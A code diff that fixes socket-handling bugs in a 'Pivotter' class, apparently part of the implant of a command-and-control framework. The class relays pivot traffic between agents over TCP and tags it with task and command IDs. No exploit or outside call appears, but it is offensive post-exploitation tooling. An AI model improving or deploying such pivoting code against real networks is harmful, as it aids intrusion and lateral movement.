@@ -139,6 +139,7 @@ BOOL CheckSocketState(SOCKET sock, int timeoutMs)
 	while (ApiWin->GetTickCount() < endTime) {
 
 		fd_set readfds;
+		FD_ZERO(&readfds);
 		readfds.fd_count = 1;
 		readfds.fd_array[0] = sock;
 		timeval timeout = { 0, 100 };
@@ -189,7 +190,7 @@ void Pivotter::LinkPivotTCP(ULONG taskId, ULONG commandId, CHAR* address, WORD p
 						if (PeekSocketTime(sock, 5000)) {
 							LPVOID buffer      = NULL;
 							ULONG  bufferSize  = 0;
-							DWORD  readedBytes = ReadDataFromSocket(sock, &buffer, &bufferSize);
+							int    readedBytes = ReadDataFromSocket(sock, &buffer, &bufferSize);
 
 							if (readedBytes > 4 && buffer) {
 								PivotData pivotData = { 0 };
@@ -319,16 +320,19 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 				fd_set  exceptfds;
 				fd_set  writefds;
 
-				writefds.fd_array[0] = pivotData->Socket;
+				FD_ZERO(&writefds);
+				FD_ZERO(&exceptfds);
 				writefds.fd_count = 1;
-				exceptfds.fd_array[0] = writefds.fd_array[0];
+				writefds.fd_array[0] = pivotData->Socket;
 				exceptfds.fd_count = 1;
+				exceptfds.fd_array[0] = pivotData->Socket;
 				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
 				if (ApiWin->__WSAFDIsSet(pivotData->Socket, &exceptfds))
 					break;
 				if (ApiWin->__WSAFDIsSet(pivotData->Socket, &writefds)) {
-					if (ApiWin->send(pivotData->Socket, (const char*)&size, 4, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
-						ApiWin->send(pivotData->Socket, (const char*)data, size, 0);
+					if (WriteToSocket(pivotData->Socket, (BYTE*)&size, 4)) {
+						WriteToSocket(pivotData->Socket, data, size);
+					}
 				}
 			}
 			this->pendingWrite = TRUE;
@@ -434,7 +438,7 @@ void Pivotter::ProcessPivots(Packer* packer)
 			if ( CheckSocketState(pivotData->Socket, 2500) ) {
 				LPVOID buffer = NULL;
 				ULONG  dataLength = 0;
-				ULONG  readed = 0;
+				int    readed = 0;
 				DWORD res = ApiWin->ioctlsocket(pivotData->Socket, FIONREAD, &dataLength);
 				if (res != -1 && dataLength >= 4) {
 					dataLength = 0;
@@ -442,7 +446,7 @@ void Pivotter::ProcessPivots(Packer* packer)
 					if (readed == 4 && dataLength) {
 						buffer = MemAllocLocal(dataLength);
 						readed = ReadFromSocket(pivotData->Socket, (PCHAR)buffer, dataLength);
-						if (readed != -1) {
+						if (readed != -1 && (ULONG)readed == dataLength) {
 							packer->Pack32(0);
 							packer->Pack32(COMMAND_PIVOT_EXEC);
 							packer->Pack32(pivotData->Id);
